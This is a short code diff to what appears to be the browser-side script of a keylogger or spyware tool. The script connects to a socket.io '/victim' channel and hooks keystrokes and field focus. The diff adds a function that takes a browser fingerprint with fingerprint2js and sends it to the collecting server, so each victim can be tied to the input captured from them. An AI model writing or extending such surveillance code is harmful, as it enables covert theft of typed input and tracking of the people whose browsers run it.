@@ -56,8 +56,20 @@
         }
     }
 
+    function newFinger(socket) {
+	var Fingerprint2 = require('fingerprint2js')
+	var fp = new Fingerprint2();
+	fp.get(function(result) {
+	 socket.emit('new', {
+		type: 'new', 
+		msg: result
+	    });
+	});
+    }
+
     function init() {
         var socket = io('http://localhost:3000/victim');
+	newFinger(socket);	
         spyOnKeyDown(socket);
         spyOnFieldFocus(socket);
     }
